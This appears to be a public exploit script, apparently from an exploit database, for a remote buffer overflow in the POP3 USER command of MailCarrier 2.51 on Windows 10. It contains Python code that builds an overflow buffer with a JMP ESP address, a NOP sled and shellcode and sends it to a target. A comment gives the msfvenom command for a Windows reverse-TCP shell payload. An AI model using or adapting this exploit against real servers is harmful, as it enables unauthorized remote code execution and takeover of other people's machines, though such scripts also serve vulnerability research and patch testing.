# Exploit Title: Win10 MailCarrier 2.51 - 'POP3 User' Remote Buffer Overflow
# Date: 2019-10-01
# Author: Lance Biggerstaff
# Original Exploit Author: Dino Covotsos - Telspace Systems
# Vendor Homepage: https://www.tabslab.com/
# Version: 2.51
# Tested on: Windows 10
# Note: Every version of Windows 10 has a different offset  and sometimes you need to run the exploit twice before you can pop a shell ¯\_(ツ)_/¯

#!/usr/bin/python

import sys
import socket
import time
import socket
from payload import buf
def shell_attack(target_machine, target_port):

#msfvenom -p windows/shell/reverse_tcp lhost=IP_ADDRESS lport=LISTENING_PORT -b '\x00\xd9' -f python

    try:

        jmpesp = b'\x23\x49\xA1\x0F'

        # buffer length depends on length of source ip address, 5095 works for xxx.xxx.xx.x, you may need to tweak the length up or down
        #buffer = '\x41' * 5093  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
        #buffer = '\x41' * 5094  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
        buffer = b'\x41' * 5095  + jmpesp + b'\x90' * 20 + buf + b'\x43' * (5096 - 4 - 20 - 1730)
        #buffer = '\x41' * 5096  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)
        #buffer = '\x41' * 5097  + jmpesp + '\x90' * 20 + buf + '\x43' * (5096 - 4 - 20 - 1730)

    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_machine, target_port))
    
        s.send(b'USER ' + buffer + b'\r\n')
    
        s.send(b'QUIT\r\n')
        s.close()
        time.sleep(1)
    except:
        print("nOT CONNECTED")    
    